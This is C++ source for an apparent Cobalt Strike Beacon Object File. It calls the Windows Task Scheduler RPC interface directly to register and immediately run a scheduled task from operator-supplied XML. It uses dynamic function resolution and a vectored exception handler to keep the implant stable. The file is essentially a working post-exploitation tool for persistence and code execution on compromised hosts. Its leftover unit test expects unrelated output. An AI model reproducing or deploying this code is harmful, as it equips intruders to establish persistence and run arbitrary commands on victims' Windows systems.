#include <Windows.h>
#include <process.h>
#include "base\helpers.h"
#include "schrpc_c.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif


extern "C" {
#include "beacon.h"
    // Define the Dynamic Function Resolution declaration for the GetLastError function
    // DFR(KERNEL32, GetLastError);
    DFR(RPCRT4, NdrClientCall2);
    DFR(MSVCRT, malloc);
    DFR(MSVCRT, free);
    DFR(MSVCRT, wcscpy);
    DFR(MSVCRT, _beginthreadex);
    DFR(MSVCRT, _endthreadex);
    // Map GetLastError to KERNEL32$GetLastError 
    // #define GetLastError KERNEL32$GetLastError
    #define NdrClientCall2 RPCRT4$NdrClientCall2
    #define malloc MSVCRT$malloc
    #define free MSVCRT$free
    #define wcscpy MSVCRT$wcscpy
    #define _beginthreadex MSVCRT$_beginthreadex
    #define _endthreadex MSVCRT$_endthreadex

    void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len);
    void __RPC_USER midl_user_free(void __RPC_FAR* ptr);

    void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
    {
        return malloc(len);
    }

    void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
    {
        free(ptr);
    }
    
    HRESULT SchRpcRegisterTask(
        /* [in] */ handle_t IDL_handle,
        /* [unique][string][in] */ const wchar_t* path,
        /* [string][in] */ const wchar_t* xml,
        /* [in] */ DWORD flags,
        /* [unique][string][in] */ const wchar_t* sddl,
        /* [in] */ DWORD logonType,
        /* [in] */ DWORD cCreds,
        /* [unique][size_is][in] */ const TASK_USER_CRED* pCreds,
        /* [string][out] */ wchar_t** pActualPath,
        /* [out] */ PTASK_XML_ERROR_INFO* pErrorInfo)
    {

        CLIENT_CALL_RETURN _RetVal;
        RPC_BINDING_HANDLE ExpIFName__MIDL_AutoBindHandle;

        const RPC_CLIENT_INTERFACE ExpIFName___RpcClientInterface =
            {
            sizeof(RPC_CLIENT_INTERFACE),
            {{0x86d35949,0x83c9,0x4044,{0xb4,0x24,0xdb,0x36,0x32,0x31,0xfd,0x0c}},{1,0}},
            {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
            0,
            0,
            0,
            0,
            0,
            0x00000000
            };

        const MIDL_STUB_DESC ExpIFName_StubDesc =
            {
            (void*)&ExpIFName___RpcClientInterface,
            midl_user_allocate,
            midl_user_free,
            &ExpIFName__MIDL_AutoBindHandle,
            0,
            0,
            0,
            0,
            rpc__MIDL_TypeFormatString.Format,
            1, /* -error bounds_check flag */
            0x50002, /* Ndr library version */
            0,
            0x800025b, /* MIDL Version 8.0.603 */
            0,
            0,
            0,  /* notify & notify_flag routine table */
            0x1, /* MIDL flag */
            0, /* cs routines */
            0,   /* proxy/server info */
            0
            };

        _RetVal = NdrClientCall2(
            (PMIDL_STUB_DESC)&ExpIFName_StubDesc,
            (PFORMAT_STRING)&rpc__MIDL_ProcFormatString.Format[42],
            IDL_handle,
            path,
            xml,
            flags,
            sddl,
            logonType,
            cCreds,
            pCreds,
            pActualPath,
            pErrorInfo);
        return (HRESULT)_RetVal.Simple;
    }

    HRESULT SchRpcRun(
        /* [in] */ handle_t IDL_handle,
        /* [string][in] */ const wchar_t* path,
        /* [in] */ DWORD cArgs,
        /* [unique][size_is][string][in] */ const wchar_t** pArgs,
        /* [in] */ DWORD flags,
        /* [in] */ DWORD sessionId,
        /* [string][unique][in] */ const wchar_t* user,
        /* [out] */ GUID* pGuid)
    {

        CLIENT_CALL_RETURN _RetVal;
        RPC_BINDING_HANDLE ExpIFName__MIDL_AutoBindHandle;

        const RPC_CLIENT_INTERFACE ExpIFName___RpcClientInterface =
            {
            sizeof(RPC_CLIENT_INTERFACE),
            {{0x86d35949,0x83c9,0x4044,{0xb4,0x24,0xdb,0x36,0x32,0x31,0xfd,0x0c}},{1,0}},
            {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
            0,
            0,
            0,
            0,
            0,
            0x00000000
            };

        const MIDL_STUB_DESC ExpIFName_StubDesc =
            {
            (void*)&ExpIFName___RpcClientInterface,
            midl_user_allocate,
            midl_user_free,
            &ExpIFName__MIDL_AutoBindHandle,
            0,
            0,
            0,
            0,
            rpc__MIDL_TypeFormatString.Format,
            1, /* -error bounds_check flag */
            0x50002, /* Ndr library version */
            0,
            0x800025b, /* MIDL Version 8.0.603 */
            0,
            0,
            0,  /* notify & notify_flag routine table */
            0x1, /* MIDL flag */
            0, /* cs routines */
            0,   /* proxy/server info */
            0
            };

        _RetVal = NdrClientCall2(
            (PMIDL_STUB_DESC)&ExpIFName_StubDesc,
            (PFORMAT_STRING)&rpc__MIDL_ProcFormatString.Format[738],
            IDL_handle,
            path,
            cArgs,
            pArgs,
            flags,
            sessionId,
            user,
            pGuid);
        return (HRESULT)_RetVal.Simple;
    }

    RPC_IF_HANDLE SetBinding()
    {
        DFR_LOCAL(RPCRT4, RpcStringBindingComposeW);
        DFR_LOCAL(RPCRT4, RpcBindingFromStringBindingW);
        DFR_LOCAL(RPCRT4, RpcStringFreeW);

        RPC_IF_HANDLE bindHandle;
        RPC_STATUS rpcStatus;
        RPC_WSTR pszStringBinding = NULL;

        rpcStatus = RpcStringBindingComposeW(
            NULL,
            (RPC_WSTR)L"ncalrpc",
            NULL,
            NULL,
            NULL,
            &pszStringBinding);

        if (rpcStatus)
        {
            BeaconPrintf(CALLBACK_ERROR, "String compose failed with status: %x.", rpcStatus);
        }

        rpcStatus = RpcBindingFromStringBindingW(pszStringBinding, &bindHandle);

        if (rpcStatus)
        {
            BeaconPrintf(CALLBACK_ERROR, "BindFromString failed with status: %x.", rpcStatus);
        }

        RpcStringFreeW(&pszStringBinding);
        return bindHandle;
    }

    typedef struct Params {
        wchar_t task[512];
        wchar_t xml[2048];
    } Params;

    void addschtask(wchar_t* taskname, wchar_t* xml)
    {
        RPC_STATUS status;
        RPC_IF_HANDLE BindingHandle = SetBinding();

        wchar_t* actualPath = NULL;
        TASK_XML_ERROR_INFO* errorInfo = NULL;

        status = SchRpcRegisterTask(BindingHandle, taskname, xml, 2, NULL, 0, 0, NULL, &actualPath, &errorInfo);
        if (status == RPC_S_OK)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "RegisterTask successfull.");

            GUID pGuid;
            status = SchRpcRun(BindingHandle, taskname, NULL, NULL, 2, NULL, NULL, &pGuid);
            if (status == RPC_S_OK)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "RunTask successfull.");
            }
            else BeaconPrintf(CALLBACK_ERROR, "RunTask failed status: %x", status);
        }
        else BeaconPrintf(CALLBACK_ERROR, "RegisterTask failed status: %x", status);
    }

    unsigned __stdcall BeginStub(void* p)
    {
        Params* params = (Params*)p;
        addschtask(params->task, params->xml);
        return 0;
    }

    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
    {
        _endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    void go(char* args, int len) {
        /**
         * Define the Dynamic Function Resolution declaration for the GetSystemDirectoryA function
         * This time we use the DFR_LOCAL macro which create a local function pointer variable that
         * points to GetSystemDirectoryA. Therefore, we do have to map GetSystemDirectoryA to
         * KERNEL32$GetSystemDirectoryA
         */
        
        DFR_LOCAL(KERNEL32, AddVectoredExceptionHandler);
        DFR_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);
        DFR_LOCAL(KERNEL32, MultiByteToWideChar);
        DFR_LOCAL(KERNEL32, WaitForSingleObject);
        DFR_LOCAL(KERNEL32, GetExitCodeThread);
        DFR_LOCAL(KERNEL32, CloseHandle);

        datap parser;
        DWORD exitcode = 0;
        HANDLE thread = NULL;
        PVOID handler = NULL;
        Params* params = NULL;

        wchar_t* TaskName = NULL;
        wchar_t* XmlBuffer = NULL;

        BeaconDataParse(&parser, args, len);
        {
            TaskName = (wchar_t*)BeaconDataExtract(&parser, NULL);
            XmlBuffer = (wchar_t*)BeaconDataExtract(&parser, NULL);
        }

        params = (Params*)malloc(sizeof(Params));

        wcscpy(params->task, TaskName);
        wcscpy(params->xml, XmlBuffer);
        
        handler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
        thread = (HANDLE)_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
        WaitForSingleObject(thread, INFINITE);
        GetExitCodeThread(thread, &exitcode);
        if (exitcode != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: %x\n", exitcode);
        }
        if (thread) { CloseHandle(thread); }
        if (handler) { RemoveVectoredExceptionHandler(handler); }
        if (params) { free(params); }
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

#pragma comment(lib,"RpcRT4.lib")

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    //bof::runMocked<>(go);
    bof::runMocked<const char*, const char*>(go, "Test Task", "calc.exe");
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif